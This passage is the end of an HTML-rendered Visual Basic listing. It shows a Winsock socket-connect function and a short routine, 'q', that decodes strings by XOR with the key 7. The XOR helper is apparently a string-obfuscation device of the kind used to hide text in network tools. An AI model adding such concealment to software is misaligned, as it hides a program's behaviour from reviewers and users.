</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">WSAAsyncSelect</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">HWndToMsg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">1025</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">SelectOps</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">connect</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockin</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockaddr_size</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
 </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">q</span><span class="sc6">(</span><span class="sc7">j</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">R</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">j</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">q</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">q</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">j</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">R</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc3">Xor</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span></div></body>
</html>
